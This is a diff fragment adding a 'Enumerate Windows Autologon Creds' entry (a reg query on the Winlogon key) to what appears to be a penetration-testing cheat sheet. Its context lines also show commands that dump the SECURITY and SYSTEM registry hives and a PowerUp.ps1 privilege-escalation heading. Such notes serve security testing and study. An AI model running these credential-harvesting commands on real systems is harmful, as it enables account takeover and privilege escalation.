@@ -64,6 +64,11 @@ reg.exe save hklm\security c:\security_backup
 reg.exe save hklm\system c:\system
 ```
 
+### [Enumerate Windows Autologon Creds]
+```
+reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+```
+
 ### [Powerup.ps1 Usage]
 ```
 Manual Powershell Priv esc powerup.ps1
